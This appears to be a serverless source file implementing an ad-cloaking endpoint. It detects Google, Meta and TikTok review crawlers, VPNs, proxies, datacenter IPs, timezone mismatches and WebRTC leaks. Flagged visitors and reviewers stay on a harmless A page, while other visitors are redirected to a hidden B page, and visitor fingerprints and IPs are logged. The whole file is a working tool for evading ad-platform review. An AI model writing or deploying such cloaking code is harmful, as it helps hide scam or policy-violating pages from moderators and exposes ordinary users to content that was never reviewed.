// POST /api/ab-cloak — AB页斗篷判定（公开，无鉴权）
// A页守卫脚本（根目录 ab-ck.js）在页面加载时调用此接口，
// 服务端综合：白名单 → 爬虫UA → 设备 → 语言 → 时区 → IP黑名单 → 时区一致性(代理/VPN/机房)，
// 返回 { redirect }：真实用户跳 b_url，爬虫/被屏蔽（命中规则）留在 A 页（redirect=null），无配置/未开通则 redirect=null。
// 与既有斗篷(functions/api/cloak.js)完全独立，不复用其接口。

const jsonHeaders = { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*', 'Cache-Control': 'no-store' };

function parseJson(s, d) { try { return JSON.parse(s); } catch (e) { return d; } }
function on(t) { return !!(t && t.enabled); }

function detectCrawler(ua) {
  var u = (ua || '').toLowerCase();
  if (!u) return null;
  // Google 系爬虫（搜索 / 广告审核 / 抓取 / 验证等各类 UA 全覆盖）
  if (u.indexOf('googlebot') !== -1 || u.indexOf('mediapartners-google') !== -1 || u.indexOf('adsbot-google') !== -1 || u.indexOf('apis-google') !== -1 || u.indexOf('google-inspectiontool') !== -1 || u.indexOf('googleother') !== -1 || u.indexOf('google-extended') !== -1 || u.indexOf('google-read-aloud') !== -1 || u.indexOf('storebot-google') !== -1) return 'google';
  // Facebook / Meta 系爬虫（新旧 UA 全覆盖）
  if (u.indexOf('facebookexternalhit') !== -1 || u.indexOf('facebookcatalog') !== -1 || u.indexOf('facebookbot') !== -1 || u.indexOf('facebot') !== -1 || u.indexOf('meta-externalagent') !== -1 || u.indexOf('meta-externalfetcher') !== -1) return 'facebook';
  // TikTok / 字节系爬虫
  if (u.indexOf('bytespider') !== -1 || u.indexOf('bytedance') !== -1 || u.indexOf('tiktok') !== -1 || u.indexOf('toutiaospider') !== -1) return 'tiktok';
  return null;
}

function detectDevice(ua) {
  var u = ua || '';
  if (/Android/i.test(u)) return 'android';
  if (/iPhone|iPod/i.test(u)) return 'ios';
  if (/iPad/i.test(u)) return 'ios';
  if (/Macintosh|Mac OS X/i.test(u)) return 'mac';
  if (/Windows|Linux|CrOS/i.test(u)) return 'pc';
  return 'other';
}

function normLang(lang) {
  var l = (lang || '').toLowerCase();
  var primary = l.split('-')[0].split('_')[0];
  if (primary === 'zh') {
    if (l.indexOf('hk') !== -1 || l.indexOf('mo') !== -1) return 'zh-hk'; // 香港/澳门（繁体）
    if (l.indexOf('tw') !== -1 || l.indexOf('hant') !== -1) return 'zh-tw'; // 台湾（繁体）
    return 'zh-cn'; // 大陆（简体）
  }
  var map = { en: 'en', ja: 'ja', de: 'de', fr: 'fr', es: 'es', it: 'it', ar: 'ar', pl: 'pl', ko: 'ko', nl: 'nl' };
  return map[primary] || 'other';
}

// 时区匹配：列表项支持 "+8" / "-5" / "utc+8" / "Asia/Tokyo" / "Japan" / "中国" 等
function tzMatch(list, offsetEast, iana) {
  if (offsetEast === null && !iana) return false;
  var li = (list || []).map(function (x) { return String(x).trim().toLowerCase(); }).filter(Boolean);
  var iL = (iana || '').toLowerCase();
  for (var i = 0; i < li.length; i++) {
    var t = li[i];
    if (/^[+-]?\d+(\.\d+)?$/.test(t)) { if (offsetEast !== null && Math.abs(offsetEast - parseFloat(t)) < 0.01) return true; continue; }
    var m = t.match(/^utc([+-]\d+(\.\d+)?)$/);
    if (m && offsetEast !== null && Math.abs(offsetEast - parseFloat(m[1])) < 0.01) return true;
    if (iL && (iL === t || iL.indexOf(t) !== -1 || t.indexOf(iL) !== -1)) return true;
    if (t === 'china' || t === '中国' || t === '北京') { if (offsetEast !== null && Math.abs(offsetEast - 8) < 0.01) return true; }
    else if (t === 'japan' || t === '日本' || t === '東京' || t === 'tokyo') { if (iL.indexOf('tokyo') !== -1 || (offsetEast !== null && Math.abs(offsetEast - 9) < 0.01)) return true; }
    else if (t === 'usa' || t === '美国' || t === 'america') { if (iL.indexOf('new_york') !== -1 || iL.indexOf('los_angeles') !== -1 || iL.indexOf('chicago') !== -1) return true; }
  }
  return false;
}

// 时区 → 数字偏移（小时，东正）。ipinfo 返回的是 IANA 名称（如 Asia/Shanghai），
// 这里统一换算成数字 ±N 再比较，避免中国有 asia/shanghai、asia/chongqing 等多个别名的困扰。
// 未知时区返回 null（判定时按"一致"处理，fail-open）。
function ianaOffset(iana) {
  var t = String(iana || '').toLowerCase();
  if (!t) return null;
  var map = {
    'utc': 0, 'gmt': 0, 'etc/utc': 0, 'etc/gmt': 0, 'zulu': 0,
    // 中国 / 东亚（统一 +8，别名归一）
    'asia/shanghai': 8, 'asia/chongqing': 8, 'asia/harbin': 8, 'asia/kashgar': 8, 'asia/urumqi': 8, 'prc': 8,
    'asia/hong_kong': 8, 'asia/macau': 8, 'asia/taipei': 8, 'asia/singapore': 8, 'asia/kuala_lumpur': 8, 'asia/manila': 8, 'asia/brunei': 8,
    'asia/tokyo': 9, 'asia/seoul': 9, 'asia/pyongyang': 9,
    'asia/jakarta': 7, 'asia/pontianak': 7, 'asia/bangkok': 7, 'asia/ho_chi_minh': 7, 'asia/hanoi': 7, 'asia/saigon': 7,
    'asia/dubai': 4, 'asia/muscat': 4, 'asia/riyadh': 3, 'asia/qatar': 3, 'asia/kuwait': 3, 'asia/bahrain': 3, 'asia/baghdad': 3, 'asia/tehran': 3.5,
    'asia/kolkata': 5.5, 'asia/calcutta': 5.5, 'asia/colombo': 5.5, 'asia/kathmandu': 5.75,
    'asia/dhaka': 6, 'asia/karachi': 5, 'asia/kabul': 4.5, 'asia/almaty': 6, 'asia/tashkent': 5,
    // 欧洲
    'europe/london': 0, 'europe/dublin': 0, 'europe/lisbon': 0, 'europe/reykjavik': 0,
    'europe/madrid': 1, 'europe/paris': 1, 'europe/berlin': 1, 'europe/amsterdam': 1, 'europe/brussels': 1, 'europe/rome': 1, 'europe/zurich': 1, 'europe/vienna': 1, 'europe/prague': 1, 'europe/warsaw': 1, 'europe/stockholm': 1, 'europe/copenhagen': 1, 'europe/oslo': 1, 'europe/budapest': 1,
    'europe/athens': 2, 'europe/helsinki': 2, 'europe/riga': 2, 'europe/tallinn': 2, 'europe/vilnius': 2, 'europe/sofia': 2, 'europe/bucharest': 2, 'europe/kiev': 2, 'europe/kyiv': 2,
    'europe/istanbul': 3, 'europe/moscow': 3, 'europe/minsk': 3,
    // 美洲
    'america/new_york': -5, 'america/toronto': -5, 'america/detroit': -5, 'america/bogota': -5, 'america/lima': -5, 'america/panama': -5, 'america/quito': -5, 'america/jamaica': -5,
    'america/chicago': -6, 'america/mexico_city': -6, 'america/winnipeg': -6, 'america/guatemala': -6,
    'america/denver': -7, 'america/phoenix': -7, 'america/edmonton': -7,
    'america/los_angeles': -8, 'america/vancouver': -8, 'america/tijuana': -8,
    'america/anchorage': -9,
    'america/sao_paulo': -3, 'america/argentina/buenos_aires': -3, 'america/santiago': -4, 'america/caracas': -4, 'america/halifax': -4, 'america/la_paz': -4, 'america/puerto_rico': -4, 'america/santo_domingo': -4,
    'america/honolulu': -10, 'pacific/honolulu': -10,
    // 大洋洲
    'australia/sydney': 10, 'australia/melbourne': 10, 'australia/brisbane': 10, 'australia/canberra': 10, 'australia/hobart': 10,
    'australia/perth': 8, 'australia/adelaide': 9.5, 'australia/darwin': 9.5,
    'pacific/auckland': 12, 'pacific/fiji': 12, 'pacific/guam': 10, 'pacific/port_moresby': 10,
    // 非洲
    'africa/cairo': 2, 'africa/johannesburg': 2, 'africa/nairobi': 3, 'africa/lagos': 1, 'africa/casablanca': 1, 'africa/algiers': 1, 'africa/accra': 0
  };
  return (map[t] !== undefined) ? map[t] : null;
}

// 判断是否为公网 IP（非内网/回环/保留地址），用于 WebRTC 泄露检测
function isPublicIp(ip) {
  if (!ip) return false;
  var v4 = ip.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (v4) {
    var a = +v4[1], b = +v4[2];
    if (a === 0 || a === 10 || a === 127) return false;
    if (a === 169 && b === 254) return false;          // link-local
    if (a === 172 && b >= 16 && b <= 31) return false; // 私网
    if (a === 192 && b === 168) return false;          // 私网
    if (a === 100 && b >= 64 && b <= 127) return false;// CGNAT
    if (a === 192 && (b === 0 || b === 2)) return false;
    if (a >= 224) return false;                        // 组播/保留
    return true;
  }
  // IPv6：仅 2000::/3 (global unicast) 视为公网
  var l = ip.toLowerCase();
  if (l.indexOf(':') === -1) return false;
  if (l === '::1' || l === '::') return false;
  var c = l.charAt(0);
  if (c === 'f') return false; // fe80 link-local / fc/fd ULA / ff 组播
  if (c === '2' || c === '3') return true;
  return false;
}

// WebRTC 泄露（仿 km37acd.top/ip）：出口 IP 与 WebRTC 本地 IP 不一致、且本地含公网 IP → 疑似代理/VPN/机房
function webrtcLeak(realIp, webrtcIps) {
  var arr = Array.isArray(webrtcIps) ? webrtcIps : [];
  var real = String(realIp || '').trim();
  var match = false;
  var hasPublicLocal = false;
  for (var i = 0; i < arr.length; i++) {
    var ip = String(arr[i] || '').trim();
    if (!ip || ip === '0.0.0.0' || ip === '::' || ip === '::1') continue;
    if (ip === real) match = true;      // 出口 IP 与本地候选一致 → 直连
    if (isPublicIp(ip)) hasPublicLocal = true;
  }
  return (!match && hasPublicLocal);    // 不一致 + 本地含公网 IP → 疑似代理/VPN/机房
}

function evaluateRules(rules, ctx) {
  var r = rules || {};
  var triggered = [];
  var b = r.behavior || {};
  var beh = ctx.behavior || {};

  if (on(r.crawler)) {
    var engines = r.crawler.engines || ['google', 'facebook', 'tiktok'];
    var hit = detectCrawler(ctx.ua);
    if (hit && engines.indexOf(hit) !== -1) triggered.push('crawler');
  }
  if (on(r.device)) {
    var mode = r.device.mode || 'block';
    var list = r.device.list || [];
    var inList = list.indexOf(ctx.device) !== -1;
    if (mode === 'allow' ? !inList : inList) triggered.push('device');
  }
  if (on(r.language)) {
    var lmode = r.language.mode || 'block';
    var llist = (r.language.list || []).map(normLang);
    var lin = llist.indexOf(normLang(ctx.lang)) !== -1;
    if (lmode === 'allow' ? !lin : lin) triggered.push('language');
  }
  if (on(r.timezone)) {
    var tmode = r.timezone.mode || 'block';
    var tin = tzMatch(r.timezone.list || [], ctx.tzOffset, ctx.tzIANA);
    if (tmode === 'allow' ? !tin : tin) triggered.push('timezone');
  }
  if (on(r.block_ips)) {
    var ips = r.block_ips.list || [];
    if (ctx.ip && ips.indexOf(ctx.ip) !== -1) triggered.push('block_ips');
  }
  // 代理 / VPN / 数据中心机房：三路信号任一命中即拦 ——
  // ① 时区偏移一致性（IP 时区 vs 浏览器时区相差 > 1 小时）
  // ② WebRTC 泄露（本机暴露了与出口不同的公网 IP）
  // ③ IP 情报（api.ipapi.is：机房/VPN/代理/Tor）
  if (on(r.privacy) || on(r.vpn) || on(r.proxy)) {
    var ipOff = ianaOffset(ctx.ipTz);
    var clientOff = (typeof ctx.tzOffset === 'number') ? ctx.tzOffset : null;
    var tzBad = (ipOff !== null && clientOff !== null && Math.abs(clientOff - ipOff) > 1);
    var webrtcBad = webrtcLeak(ctx.ip, ctx.webrtcIps);
    var intelBad = !!(ctx.ipIntel && (ctx.ipIntel.is_datacenter || ctx.ipIntel.is_vpn || ctx.ipIntel.is_proxy || ctx.ipIntel.is_tor));
    if (tzBad || webrtcBad || intelBad) triggered.push('privacy');
  }

  // 行为模块（AB 页默认不启用，保留逻辑供扩展，落地即跳时无行为信号）
  if (on(b.scroll_depth)) {
    var thr = b.scroll_depth.threshold;
    if (typeof thr !== 'number') thr = 90;
    if ((beh.scrollDepth || 0) < thr) triggered.push('behavior.scroll_depth');
  }
  if (on(b.mouse_curve)) {
    if (!beh.mouseMoved || !beh.mouseCurved) triggered.push('behavior.mouse_curve');
  }
  if (on(b.touch_continuity)) {
    if (!beh.touchContinuous) triggered.push('behavior.touch_continuity');
  }
  if (on(b.visibility)) {
    if (!beh.visibilityChanged) triggered.push('behavior.visibility');
  }
  if (on(b.scroll_rhythm)) {
    if (!beh.scrollRhythmIrregular) triggered.push('behavior.scroll_rhythm');
  }
  return triggered;
}

async function getIpInfo(env, ip) {
  if (!ip || ip === '127.0.0.1' || ip === '::1') return null;
  var cacheKey = 'ab:ipinfo:v2:' + ip;
  try {
    var cached = await env.kvadmin.get(cacheKey);
    if (cached) return JSON.parse(cached);
  } catch (e) {}
  var token = env.IPINFO_TOKEN || '';
  var url = 'https://ipinfo.io/' + encodeURIComponent(ip) + '/json' + (token ? '?token=' + token : '');
  try {
    var controller = new AbortController();
    var timer = setTimeout(function () { controller.abort(); }, 800);
    var res = await fetch(url, { signal: controller.signal });
    clearTimeout(timer);
    if (!res.ok) return null;
    var data = await res.json();
    var out = { timezone: data.timezone || '', country: data.country || '', region: data.region || '' };
    try { await env.kvadmin.put(cacheKey, JSON.stringify(out), { expirationTtl: 600 }); } catch (e) {}
    return out;
  } catch (e) { return null; }
}

// IP 情报（机房/VPN/代理/Tor）——api.ipapi.is 查询（key 来自 env.IPAPI_KEY）
// 失败/超时返回 null（降级忽略，不影响时区 + WebRTC 两路主判定）
async function getIpIntel(env, ip) {
  if (!ip || ip === '127.0.0.1' || ip === '::1') return null;
  var cacheKey = 'ab:ipintel:v2:' + ip;
  try {
    var cached = await env.kvadmin.get(cacheKey);
    if (cached) return JSON.parse(cached);
  } catch (e) {}
  try {
    var key = env.IPAPI_KEY || '';
    var url = 'https://api.ipapi.is?q=' + encodeURIComponent(ip) + (key ? '&key=' + encodeURIComponent(key) : '');
    var controller = new AbortController();
    var timer = setTimeout(function () { controller.abort(); }, 1500);
    var res = await fetch(url, { signal: controller.signal });
    clearTimeout(timer);
    if (!res.ok) return null;
    var d = await res.json();
    var out = {
      is_datacenter: !!d.is_datacenter,
      is_vpn: !!d.is_vpn,
      is_proxy: !!d.is_proxy,
      is_tor: !!d.is_tor
    };
    try { await env.kvadmin.put(cacheKey, JSON.stringify(out), { expirationTtl: 3600 }); } catch (e) {}
    return out;
  } catch (e) { return null; }
}

async function logTraffic(env, t) {
  try {
    await env.DB.prepare('INSERT INTO ab_traffic (a_url, username, ip, device, lang, timezone, is_vpn, is_proxy, passed, redirect_to, triggered_rules, ua, created_at) VALUES (?1,?2,?3,?4,?5,?6,?7,?8,?9,?10,?11,?12,?13)')
      .bind(t.a_url || '', t.username || '', t.ip || '', t.device || '', t.lang || '', t.timezone || '', t.isVpn ? 1 : 0, t.isProxy ? 1 : 0, t.passed ? 1 : 0, t.redirect || '', JSON.stringify(t.triggered || []), (t.ua || '').substring(0, 500), new Date().toISOString()).run();
    return { ok: true };
  } catch (e) {
    return { ok: false, error: (e && e.message) ? e.message : String(e) };
  }
}

// 反解 A 页地址 → AB 配置 + 账号权限（多级匹配：精确 → 斜杠变体 → .html → 域名）
async function resolveConfig(env, rawSite) {
  var host = rawSite;
  try { host = new URL(rawSite).hostname; } catch (e) {}
  var candidates = [rawSite];
  if (rawSite.charAt(rawSite.length - 1) === '/') candidates.push(rawSite.slice(0, -1));
  else if (rawSite.indexOf('/') > 0) candidates.push(rawSite + '/');
  if (rawSite.indexOf('.') > 0 && rawSite.indexOf('/') > 0 && rawSite.indexOf('.html') === -1) candidates.push(rawSite + '.html');
  if (host !== rawSite) candidates.push(host);

  var config = null;
  var seen = {};
  for (var i = 0; i < candidates.length; i++) {
    var c = candidates[i];
    if (seen[c]) continue; seen[c] = 1;
    try {
      var row = await env.DB.prepare('SELECT a_url, username, enabled, b_url, whitelist_ips, rules FROM ab_configs WHERE a_url = ?1').bind(c).first();
      if (row) {
        config = {
          a_url: row.a_url,
          username: row.username || '',
          enabled: row.enabled,
          b_url: row.b_url || '',
          whitelist_ips: parseJson(row.whitelist_ips, []),
          rules: parseJson(row.rules, {})
        };
        break;
      }
    } catch (e) {}
  }

  // 账号级 AB 权限：默认关闭，管理员给子账户开启后才生效
  var permOff = true;
  if (config && config.username) {
    try {
      var p = await env.DB.prepare('SELECT enabled FROM ab_permissions WHERE username = ?1').bind(config.username).first();
      permOff = !(p && p.enabled === 1);
    } catch (e) {}
  }

  return { config: config, permOff: permOff };
}

export async function onRequest(context) {
  const { request, env } = context;
  try {
    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type'
      }});
    }
    if (request.method !== 'POST') {
      return new Response(JSON.stringify({ error: 'Method not allowed' }), { status: 405, headers: jsonHeaders });
    }

    const body = await request.json();
    const rawSite = (body.site || '').trim();
    const ip = request.headers.get('CF-Connecting-IP') || '';
    const ua = request.headers.get('User-Agent') || '';
    const acceptLang = request.headers.get('Accept-Language') || '';

    const resolved = await resolveConfig(env, rawSite);
    const config = resolved.config;

    // 无配置 / 关闭 / 账号无权限 → 不跳转（fail-open，避免误伤）
    if (resolved.permOff || !config || (config.enabled !== 1 && config.enabled !== true)) {
      return new Response(JSON.stringify({ redirect: null, passed: true, disabled: !config, permOff: resolved.permOff, enabled: config ? config.enabled : null }), { headers: jsonHeaders });
    }

    var client = body.client || {};
    var tzOffset = (typeof client.timezoneOffset === 'number') ? client.timezoneOffset : null;
    var tzIANA = client.timezoneIANA || '';
    var clientLang = client.lang || acceptLang;
    var webrtcIps = Array.isArray(client.webrtcIps) ? client.webrtcIps : [];
    var device = detectDevice(ua);
    var whitelist = config.whitelist_ips || [];
    var whitelisted = Array.isArray(whitelist) && ip && whitelist.indexOf(ip) !== -1;

    var triggered = [];
    var ipTz = '';
    var ipIntel = null;
    if (!whitelisted) {
      var rules = config.rules || {};
      var needIp = on(rules.privacy) || on(rules.vpn) || on(rules.proxy);
      if (needIp) {
        var both = await Promise.all([getIpInfo(env, ip), getIpIntel(env, ip)]);
        var ipInfo = both[0];
        ipIntel = both[1];
        if (ipInfo) { ipTz = ipInfo.timezone || ''; }
      }
      triggered = evaluateRules(rules, { ip: ip, ua: ua, device: device, lang: clientLang, tzOffset: tzOffset, tzIANA: tzIANA, ipTz: ipTz, webrtcIps: webrtcIps, ipIntel: ipIntel });
    }

    var passed = triggered.length === 0;
    // 真实用户 → B 页；爬虫/被屏蔽（命中规则）→ 留在 A 页（不跳转）
    var redirect = passed ? (config.b_url || null) : null;

    // 记录流量（异步，不阻塞跳转响应；ab_traffic 表未建时静默跳过）
    context.waitUntil(logTraffic(env, { a_url: config.a_url, username: config.username || '', ip: ip, device: device, lang: clientLang, timezone: tzIANA || (tzOffset !== null ? String(tzOffset) : ''), isVpn: !!(ipIntel && ipIntel.is_vpn), isProxy: !!(ipIntel && ipIntel.is_proxy), passed: passed, redirect: redirect, triggered: triggered, ua: ua }));

    return new Response(JSON.stringify({ redirect: redirect, passed: passed, triggered: triggered, whitelisted: whitelisted, _dbg: { a_url: config.a_url, username: config.username, device: device, ip: ip } }), { headers: jsonHeaders });
  } catch (e) {
    // 兜底不跳转，避免落地页因服务端异常被整体带走
    return new Response(JSON.stringify({ redirect: null, passed: true, error: e.message }), { headers: jsonHeaders });
  }
}
